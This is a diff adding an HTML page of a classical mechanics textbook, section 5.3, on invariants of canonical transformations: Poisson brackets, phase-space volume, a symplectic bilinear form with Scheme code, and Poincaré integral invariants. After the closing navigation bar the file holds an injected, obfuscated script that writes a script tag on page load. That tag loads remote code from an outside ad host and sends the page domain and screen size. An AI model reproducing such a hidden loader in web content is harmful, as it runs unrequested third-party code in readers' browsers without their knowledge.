@@ -1,0 +1,350 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-59.html">previous</a></span><span>, <a href="book-Z-H-61.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_5.3"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_5.3">5.3&nbsp;&nbsp;Invariants of Canonical Transformations</a></h2>
+<p><a name="%_idx_2592"></a><a name="%_idx_2594"></a>
+Canonical transformations allow us to change the phase-space
+coordinate system that we use to express a problem, preserving the
+form of Hamilton's equations.  If we solve Hamilton's equations in one
+phase-space coordinate system we can use the transformation to carry
+the solution to the other coordinate system.  What other properties
+are preserved by a canonical transformation?</p>
+<p>
+</p>
+<a name="%_sec_Temp_349"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_349">Noninvariance of <em>p</em> <em>v</em></a></h4>
+<p><a name="%_idx_2596"></a>We noted in equation&nbsp;(<a href="book-Z-H-58.html#EQUATION_5.10">5.10</a>) that canonical
+extensions of point transformations preserve the value of <em>p</em> <em>v</em>.
+This does not hold for more general canonical transformations.  We can
+illustrate this with the transformation just considered.  Along
+corresponding paths <em>x</em>, <em>p</em><sub><em>x</em></sub> and <img src="chap1-Z-G-D-19.gif" border="0">, <em>I</em>
+<a name="EQUATION_5.64"></a></p>
+<div align=left><img src="chap5-Z-G-63.gif" border="0"></div>
+<p>
+and so <em>D</em><em>x</em> is 
+<a name="EQUATION_5.65"></a></p>
+<div align=left><img src="chap5-Z-G-64.gif" border="0"></div>
+<p>
+The difference of <em>p</em> <em>v</em> and the transformed <em>p</em>' <em>v</em>' is
+<a name="EQUATION_5.66"></a></p>
+<div align=left><img src="chap5-Z-G-65.gif" border="0"></div>
+<p>
+In general this is not zero.  
+The product <em>p</em><em>v</em> is not necessarily invariant under general canonical
+transformations.</p>
+<p>
+</p>
+<a name="%_sec_Temp_350"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_350">Invariance of Poisson brackets</a></h4>
+<p><a name="%_idx_2598"></a><a name="%_idx_2600"></a>
+Here is a remarkable fact: the composition of the Poisson bracket of
+two phase-space state functions with a canonical transformation is the
+same as the Poisson bracket of each of the two functions composed with
+the transformation separately.  Loosely speaking, the Poisson bracket
+is invariant under canonical phase-space transformations.</p>
+<p>
+Let <em>f</em> and <em>g</em> be two phase-space state functions.   
+Using the <img src="chap5-Z-G-D-1.gif" border="0"> representation of the Poisson bracket (see
+section <a href="book-Z-H-59.html#%_sec_5.2.4">5.2.4</a>), we deduce
+<a name="EQUATION_5.67"></a></p>
+<div align=left><img src="chap5-Z-G-66.gif" border="0"></div>
+<p>
+where the fact that <em>C</em> is symplectic and satisfies
+equation&nbsp;(<a href="book-Z-H-59.html#EQUATION_5.52">5.52</a>) was used in the
+middle.  Abstracted to functions of phase-space states, this is
+<a name="EQUATION_5.68"></a></p>
+<div align=left><img src="chap5-Z-G-67.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_351"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_351">Volume preservation</a></h4>
+<p><a name="%_idx_2602"></a><a name="%_idx_2604"></a>
+Consider a canonical transformation <em>C</em>.  Let <img src="chap5-Z-G-D-4.gif" border="0"><sub><em>t</em></sub> be a
+function with parameter <em>t</em> such that (<em>q</em>, <em>p</em>)  =  <img src="chap5-Z-G-D-4.gif" border="0"><sub><em>t</em></sub>(<em>q</em>', <em>p</em>') if 
+(<em>t</em>, <em>q</em>, <em>p</em>)  =  <em>C</em>(<em>t</em>, <em>q</em>', <em>p</em>').  The function <img src="chap5-Z-G-D-4.gif" border="0"><sub><em>t</em></sub> maps phase-space
+coordinates to alternate phase-space coordinates at a given time. 
+Consider regions <em>R</em> in (<em>q</em>, <em>p</em>) and <em>R</em>' in (<em>q</em>', <em>p</em>') such
+that <em>R</em>  =  <img src="chap5-Z-G-D-4.gif" border="0"><sub><em>t</em></sub>(<em>R</em>').  The volume of region <em>R</em>'&nbsp;is
+<a name="EQUATION_5.69"></a></p>
+<div align=left><img src="chap5-Z-G-68.gif" border="0"></div>
+<p>
+where <img src="chap3-Z-G-D-8.gif" border="0"> is the function whose value is one for every input.
+Now if <em>C</em> is symplectic then the determinant of <em>D</em> <img src="chap5-Z-G-D-4.gif" border="0"><sub><em>t</em></sub> is one
+(see section&nbsp;<a href="book-Z-H-50.html#%_sec_4.2">4.2</a>), so
+<a name="EQUATION_5.70"></a></p>
+<div align=left><img src="chap5-Z-G-69.gif" border="0"></div>
+<p>
+Thus, phase-space volume is preserved by symplectic transformations.</p>
+<p>
+Liouville's theorem shows that time evolution preserves phase-space
+volume.  Here we see that canonical transformations also preserve
+phase volumes.   Later, we will find that time evolution actually
+generates a canonical transformation.</p>
+<p>
+</p>
+<a name="%_sec_Temp_352"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_352">A bilinear form preserved by symplectic transformations</a></h4>
+<p><a name="%_idx_2606"></a><a name="%_idx_2608"></a><a name="%_idx_2610"></a>
+The invariance of Poisson brackets under canonical transformations can
+be used to prove the invariance of another closely related
+<a name="%_idx_2612"></a>antisymmetric bilinear form under canonical transformations.  Define<a name="call_footnote_Temp_353" href="#footnote_Temp_353"><sup><small>11</small></sup></a>
+<a name="%_idx_2614"></a><a name="EQUATION_5.71"></a></p>
+<div align=left><img src="chap5-Z-G-71.gif" border="0"></div>
+<p>
+where <em>Q</em> = <em>I</em><sub>1</sub> and <em>P</em> = <em>I</em><sub>2</sub> are the coordinate and momentum selectors,
+respectively.  The arguments <img src="chap2-Z-G-D-10.gif" border="0"><sub>1</sub> and <img src="chap2-Z-G-D-10.gif" border="0"><sub>2</sub> are incremental
+phase-space states.  Under a canonical transformation <em>s</em>  =  <em>C</em>(<em>s</em>'),
+incremental states transform with the derivative
+<a name="EQUATION_5.72"></a></p>
+<div align=left><img src="chap5-Z-G-72.gif" border="0"></div>
+<p>
+We will show that
+<a name="EQUATION_5.73"></a></p>
+<div align=left><img src="chap5-Z-G-73.gif" border="0"></div>
+<p>
+provided the <img src="chap2-Z-G-D-10.gif" border="0"><sub><em>i</em></sub>' have zero time component.</p>
+<p>
+Condition&nbsp;(<a href="book-Z-H-59.html#EQUATION_5.27">5.27</a>) that a time-independent <em>C</em> with
+compositional Hamiltonian <em>H</em> is canonical is equivalent to the
+symplectic condition&nbsp;(<a href="book-Z-H-59.html#EQUATION_5.31">5.31</a>),
+which does not mention the Hamiltonian <em>H</em>.  So for time-independent
+symplectic <em>C</em>, condition&nbsp;(<a href="book-Z-H-59.html#EQUATION_5.27">5.27</a>) is also satisfied with the
+Hamiltonian replaced by any function <em>f</em> on the phase-state space:
+<a name="EQUATION_5.74"></a></p>
+<div align=left><img src="chap5-Z-G-74.gif" border="0"></div>
+<p>
+We will use this in the following.</p>
+<p>
+<a name="%_idx_2616"></a>In terms of <img src="chap1-Z-G-D-23.gif" border="0">, the Poisson bracket is
+<a name="EQUATION_5.75"></a></p>
+<div align=left><img src="chap5-Z-G-75.gif" border="0"></div>
+<p>
+as can be seen by writing out the components.  We use the fact that 
+Poisson brackets are invariant under canonical transformations:
+<a name="EQUATION_5.76"></a></p>
+<div align=left><img src="chap5-Z-G-76.gif" border="0"></div>
+<p>
+The left-hand side of equation&nbsp;(<a href="#EQUATION_5.76">5.76</a>) is
+<a name="EQUATION_5.77"></a></p>
+<div align=left><img src="chap5-Z-G-77.gif" border="0"></div>
+<p>
+where we have used the relation&nbsp;(<a href="#EQUATION_5.74">5.74</a>).
+The right-hand side of
+equation&nbsp;(<a href="#EQUATION_5.76">5.76</a>) is
+<a name="EQUATION_5.78"></a></p>
+<div align=left><img src="chap5-Z-G-78.gif" border="0"></div>
+<p>
+Now the left-hand side must equal the right-hand side for any <em>f</em>
+and <em>g</em>, so the equation must also be true for arbitrary <img src="chap2-Z-G-D-10.gif" border="0"><sub><em>i</em></sub>' of the form
+<a name="EQUATION_5.79"></a></p>
+<div align=left><img src="chap5-Z-G-79.gif" border="0"></div>
+<p>
+The <img src="chap2-Z-G-D-10.gif" border="0">'<sub><em>i</em></sub> are arbitrary incremental states with zero time components.</p>
+<p>
+So we have proven that
+<a name="EQUATION_5.80"></a></p>
+<div align=left><img src="chap5-Z-G-80.gif" border="0"></div>
+<p>
+for canonical <em>C</em> and incremental states <img src="chap2-Z-G-D-10.gif" border="0">'<sub><em>i</em></sub> with zero time
+components.  Using equation&nbsp;(<a href="#EQUATION_5.72">5.72</a>), we have
+<a name="EQUATION_5.81"></a></p>
+<div align=left><img src="chap5-Z-G-81.gif" border="0"></div>
+<p>
+Thus the bilinear antisymmetric function <img src="chap1-Z-G-D-23.gif" border="0"> is invariant under
+canonical transformations.  </p>
+<p>
+As a program, <img src="chap1-Z-G-D-23.gif" border="0"> is
+</p>
+<p><tt><a name="%_idx_2618"></a>(define&nbsp;(omega&nbsp;zeta1&nbsp;zeta2)<br>
+&nbsp;&nbsp;(-&nbsp;(*&nbsp;(momentum&nbsp;zeta2)&nbsp;(coordinate&nbsp;zeta1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;(momentum&nbsp;zeta1)&nbsp;(coordinate&nbsp;zeta2))))<br>
+</p>
+</tt>
+<p>We can check that it is invariant under the polar to rectangular canonical transformation by
+computing the residuals.  We use the arbitrary state
+</p>
+<p><tt>(define&nbsp;a-polar-state<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'r&nbsp;'phi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'pr&nbsp;'pphi)))<br>
+</p>
+</tt>
+<p>and the typical state increments
+</p>
+<p><tt>(define&nbsp;zeta1&nbsp;<br>
+&nbsp;&nbsp;(up&nbsp;0&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'dr1&nbsp;'dphi1)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'dpr1&nbsp;'dpphi1)))<br>
+<br>
+(define&nbsp;zeta2&nbsp;<br>
+&nbsp;&nbsp;(up&nbsp;0&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'dr2&nbsp;'dphi2)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'dpr2&nbsp;'dpphi2)))<br>
+</p>
+</tt>
+<p>Note that the time components of <tt>zeta1</tt> and <tt>zeta2</tt> are
+zero. We evaluate the residual:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;&nbsp;(let&nbsp;((DCs&nbsp;((D&nbsp;(F-&gt;CT&nbsp;p-&gt;r))&nbsp;a-polar-state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;(omega&nbsp;zeta1&nbsp;zeta2)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(omega&nbsp;(*&nbsp;DCs&nbsp;zeta1)&nbsp;(*&nbsp;DCs&nbsp;zeta2)))))<br>
+<i>0</i><br>
+</p>
+</tt>
+<p>The residual is zero so <img src="chap1-Z-G-D-23.gif" border="0"> is invariant under this canonical
+transformation.</p>
+<p>
+</p>
+<a name="%_sec_Temp_354"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_354">Poincar&eacute; integral invariants</a></h4>
+<p>
+<a name="%_idx_2620"></a><a name="%_idx_2622"></a>
+Consider the oriented area of a region <em>R</em>' in phase space (see
+figure&nbsp;<a href="book-Z-H-1000.html#FIGURE_5.2">5.2</a>).  Suppose we make a canonical transformation
+from coordinates (<em>q</em>', <em>p</em>') to (<em>q</em>, <em>p</em>) taking region <em>R</em>' to region
+<em>R</em>.  The boundary of the region in the transformed coordinates is
+just the image under the canonical transformation of the original
+boundary.  Let <em>R</em><sub><em>q</em><sup><em>i</em></sup>, <em>p</em><sub><em>i</em></sub></sub> be the
+projection of the region <em>R</em> onto the <em>q</em><sup><em>i</em></sup>, <em>p</em><sub><em>i</em></sub> plane of coordinate
+<em>q</em><sup><em>i</em></sup> and conjugate momentum <em>p</em><sub><em>i</em></sub>, and let <em>A</em><sub><em>i</em></sub> be its area.  We call
+the <em>q</em><sup><em>i</em></sup>, <em>p</em><sub><em>i</em></sub> plane the <em>i</em>th <a name="%_idx_2624"></a><em>canonical plane</em> in these
+phase-space variables.  Similarly, let <em>R</em>'<sub><em>q</em>'<sup><em>i</em></sup>, <em>p</em>'<sub><em>i</em></sub></sub> be the
+projection of <em>R</em>' onto the <em>q</em>'<sup><em>i</em></sup>, <em>p</em>'<sub><em>i</em></sub> plane, and let <em>A</em>'<sub><em>i</em></sub> be its
+area.  Then it turns out that the sums of the areas of the projections
+of <em>R</em> and of <em>R</em>' are the same:
+<a name="EQUATION_5.82"></a></p>
+<div align=left><img src="chap5-Z-G-82.gif" border="0"></div>
+<p>
+That is, the sum of the projected areas on the canonical planes is
+preserved by canonical transformations.  Another way to say this is
+<a name="EQUATION_5.83"></a></p>
+<div align=left><img src="chap5-Z-G-83.gif" border="0"></div>
+<p></p>
+<p>
+<a name="FIGURE_5.2"></a></p>
+<div align=left><img src="chap5-Z-G-84.gif" border="0"></div>
+<p></p>
+<p>
+To see why this is true, we first consider how the area of an
+incremental parallelogram in phase space transforms under canonical
+transformation.  Let (<img src="chap1-Z-G-D-43.gif" border="0"> <em>q</em>, <img src="chap1-Z-G-D-43.gif" border="0"> <em>p</em>) and (<img src="chap1-Z-G-D-17.gif" border="0"> <em>q</em>, <img src="chap1-Z-G-D-17.gif" border="0"> <em>p</em>)
+be small increments in phase space, originating at (<em>q</em>, <em>p</em>).
+Consider the incremental parallelogram with vertex at (<em>q</em>, <em>p</em>) with
+these two phase-space increments as edges.  The sum of the areas of
+the canonical projections of this incremental parallelogram can be
+written
+<a name="EQUATION_5.84"></a></p>
+<div align=left><img src="chap5-Z-G-85.gif" border="0"></div>
+<p>
+The right-hand side is the sum of the areas on the canonical planes;
+for each <em>i</em> the area of a parallelogram is computed from
+the components of the vectors defining its adjacent sides.  Let
+<img src="chap2-Z-G-D-10.gif" border="0"><sub>1</sub>  =  (0 , <img src="chap1-Z-G-D-43.gif" border="0"> <em>q</em>, <img src="chap1-Z-G-D-43.gif" border="0"> <em>p</em>) and <img src="chap2-Z-G-D-10.gif" border="0"><sub>2</sub>  =  (0 , <img src="chap1-Z-G-D-17.gif" border="0"> <em>q</em>,
+<img src="chap1-Z-G-D-17.gif" border="0"> <em>p</em>); then the sum of the areas of the incremental
+parallelograms is just
+<a name="EQUATION_5.85"></a></p>
+<div align=left><img src="chap5-Z-G-86.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-23.gif" border="0"> is the bilinear antisymmetric function introduced
+in equation&nbsp;(<a href="#EQUATION_5.71">5.71</a>).  The function <img src="chap1-Z-G-D-23.gif" border="0"> is invariant under canonical
+transformations, so the sum of the areas of the incremental
+parallelograms is invariant under canonical transformations.</p>
+<p>
+The area of an arbitrary region is just the limit of the sum of the
+areas of incremental parallelograms that cover the region, so the sum
+of oriented areas is preserved by canonical transformations:
+<a name="EQUATION_5.86"></a></p>
+<div align=left><img src="chap5-Z-G-87.gif" border="0"></div>
+<p></p>
+<p>
+<a name="%_idx_2626"></a>We define an <em>action-like region</em> to be one for which canonical
+coordinates can be chosen so that the region is entirely in the
+subspace spanned by a particular canonical pair <em>q</em><sup><em>i</em></sup>, <em>p</em><sub><em>i</em></sub>.  For this
+coordinate system the projection on that plane has all of the area.
+The projections on the other canonical planes have no area.  So the
+sum of the areas of the canonical projections is just the area of the
+region itself.  The sum of the areas of the projections onto canonical
+planes is preserved under canonical transformation, so the area of an
+action-like region is the sum of the areas of the canonical
+projections for any canonical coordinate system.</p>
+<p>
+There are also regions that have no action-like projection.  For
+example, a region in the plane <em>q</em><sup><em>i</em></sup>, <em>q</em><sup><em>j</em></sup> has no action-like
+projection.  Therefore the sum of the areas of the canonical
+projections is zero, and this is the case for any canonical coordinate
+system, though in other canonical coordinates some of the projections
+may have nonzero area to be balanced by negative area of others.</p>
+<p>
+The equality-of-areas relation&nbsp;(<a href="#EQUATION_5.83">5.83</a>) 
+can also be written as an equality of line integrals using Stokes's
+theorem, for simply-connected regions <em>R</em><sub><em>q</em><sup><em>i</em></sup>, <em>p</em><sub><em>i</em></sub></sub> and <em>R</em>'<sub><em>q</em>'<sup><em>i</em></sup>,
+<em>p</em>'<sub><em>i</em></sub></sub>:
+<a name="EQUATION_5.87"></a></p>
+<div align=left><img src="chap5-Z-G-88.gif" border="0"></div>
+<p>
+The canonical planes are disjoint except at the origin, so the
+projected areas intersect in at most one point.  Thus we may
+independently accumulate the line integrals around the boundaries of
+the individual projections of the region onto the canonical planes
+into a line integral around the unprojected region:
+<a name="EQUATION_5.88"></a></p>
+<div align=left><img src="chap5-Z-G-89.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.9"></a>
+<b>Exercise 5.9.</b>&nbsp;&nbsp;<strong>Watch out</strong><br></p>
+<p>
+Consider the canonical transformation <em>C</em>:
+</p>
+<div align=left><img src="chap5-Z-G-90.gif" border="0"></div>
+<p></p>
+<p>
+<strong>a</strong>.&nbsp;&nbsp;Show that the transformation is symplectic for any <em>a</em>.</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;Show that equation&nbsp;(<a href="#EQUATION_5.88">5.88</a>)
+is not generally satisfied for the region enclosed by a curve of
+constant <em>J</em>.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_353" href="#call_footnote_Temp_353"><sup><small>11</small></sup></a> The <img src="chap1-Z-G-D-23.gif" border="0"> form can also be written as a sum over 
+degrees of freedom:
+</p>
+<div align=left><img src="chap5-Z-G-70.gif" border="0"></div>
+<p>
+Notice that the contributions for each <em>i</em> do not mix components from
+different degrees of freedom.</p>
+<p>
+This bilinear form is closely related to the symplectic 2-form of
+differential geometry.  It differs in that the symplectic 2-form
+is formally a function of the phase-space point as well as the
+incremental vectors.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-59.html">previous</a></span><span>, <a href="book-Z-H-61.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3cKtWegTtPnbkpM8m5IQ3pWnPoEcEJ3%2bUqHBuAu5Nq%2b8EUBWJ%2bEKJpn9%2fts3tVqlycsQeQOlUx4i0Xn6olC7eAzcqcNPft8ytnZfW8AaSxTJB8vJoCFJAbJcYUFCh3GqVTsHUGXgHf9%2br%2f%2bBqkanfSeF1oiHzWpLnfbZCreVJL27PGjcHMc5A5CXEY%2ba6UAaqW0CjUKl5%2flDaiJUPrd2yI%2bCHcgdh1sbfvkm1CXatQy6MVd3rf0E%2bIHT3S8KftTZhpbDArlwIeLvBI8qhXpCbaP0VDwdKWNHfqAuTctySy2APlQt0nqWlfn0ZlXaLcSrxS69eUrGZwk8j9SIjgpejVybk%2fM4tesL0eBzOxjJUUriDdDa2wc6zci4B10Q8NX7p%2b6Rt%2bPSu%2bDxIe1gvXlw8ABz17HvOOVr1Yumg6QTRivWIIp2O21bhpAbdp3d59u9QpeKVfFswzfGTtO3Z1gAfl");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
